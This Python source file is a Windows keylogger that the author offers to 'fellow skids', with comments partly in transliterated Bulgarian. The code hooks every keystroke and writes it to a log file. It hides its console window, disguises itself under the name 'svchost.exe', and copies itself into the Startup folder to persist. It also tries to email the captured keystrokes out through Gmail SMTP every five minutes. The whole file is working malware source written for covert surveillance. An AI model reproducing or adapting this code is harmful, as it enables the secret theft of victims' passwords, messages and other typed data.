# original code i wrote but needed one for win 7 which is a 10000000000000 times simpler to think of AND create
# also has APPROX 120 less lines trust
# fellow skids use with caution thanks i am not responsible for your dogshit social engineering or below average ninja skills

import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import threading
import time
import sys
from datetime import datetime
import win32api
import win32con
import ctypes
import psutil
from pathlib import Path

class Keylogger:
    def __init__(self, log_file="keylog.txt", email_to=None, email_from=None, 
                 email_pass=None, send_interval=60):
        self.log_file = log_file
        self.email_to = email_to
        self.email_from = email_from
        self.email_pass = email_pass
        self.send_interval = send_interval
        self.last_send = time.time()
        self.log_buffer = []
        
        # log dir dali sushtestvuva
        Path(self.log_file).parent.mkdir(parents=True, exist_ok=True)
        
        # krii konzolata
        self.hide_console()
        
    def hide_console(self):
        """Hide the console window for stealth"""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def callback(self, event):
        """Handle each keypress event"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key = event.name
        
        # handle special keys ili nesh takoa
        if len(key) > 1:
            key = f"[{key.upper()}]"
        else:
            key = key.replace(" ", "SPACE")
        
        log_entry = f"[{timestamp}] {key}"
        self.log_buffer.append(log_entry)
        
        # pishi vnezapno v fail
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
        
        # tva daje ne znam shto go dobavih ama ne raboti best skid in town
        if self.email_to and time.time() - self.last_send > self.send_interval:
            self.send_log()
    
    def send_log(self):
        """Send log file via email"""
        try:
            # log read
            with open(self.log_file, "r", encoding="utf-8") as f:
                log_content = f.read()
            
            msg = MIMEMultipart()
            msg['From'] = self.email_from
            msg['To'] = self.email_to
            msg['Subject'] = f"Keylog Capture - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            msg.attach(MIMEText(log_content, 'plain'))
            
            # log file attachment
            with open(self.log_file, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {os.path.basename(self.log_file)}'
            )
            msg.attach(part)
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email_from, self.email_pass)
            server.sendmail(self.email_from, self.email_to, msg.as_string())
            server.quit()
            
            self.last_send = time.time()
            print("Log sent successfully")
            
        except Exception as e:
            print(f"Email send failed: {e}")
    
    def anti_detection(self):
        """Basic anti-detection measures"""
        # process name change
        try:

            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass
        

        pass
    
    def run(self):
        """Start the keylogger"""
        print("Keylogger started. Press Ctrl+C to stop.")
        print("Logging to:", self.log_file)
        
        # keyboard hook
        keyboard.hook(self.callback)
        
        # anti-detection
        anti_detect_thread = threading.Thread(target=self.anti_detection_loop, daemon=True)
        anti_detect_thread.start()
        
        try:
            # prolongued run
            keyboard.wait()
        except KeyboardInterrupt:
            print("\nKeylogger stopped.")
            if self.email_to:
                self.send_log()
            sys.exit(0)
    
    def anti_detection_loop(self):
        """Continuous anti-detection measures"""
        while True:
            time.sleep(30)

            pass

# startup apps
def add_to_startup():
    """Add keylogger to Windows startup (for persistence testing)"""
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    try:
        import shutil
        shutil.copy2(script_path, os.path.join(startup_folder, 'svchost.py'))
    except:
        pass

if __name__ == "__main__":

    KEYLOG_FILE = "F:\\keylog.txt"  #directoriq na dump file keylog file yada yada text file
    
    # ama tva PAK ne raboti
    EMAIL_TO = ""  # email
    EMAIL_FROM = ""
    EMAIL_PASS = ""  # email app password
    
    # inicializaciq i run
    kl = Keylogger(
        log_file=KEYLOG_FILE,
        email_to=EMAIL_TO,
        email_from=EMAIL_FROM,
        email_pass=EMAIL_PASS,
        send_interval=300  # Send every 5 minutes
    )
    
    # add persistence
    add_to_startup()
    
    kl.run()
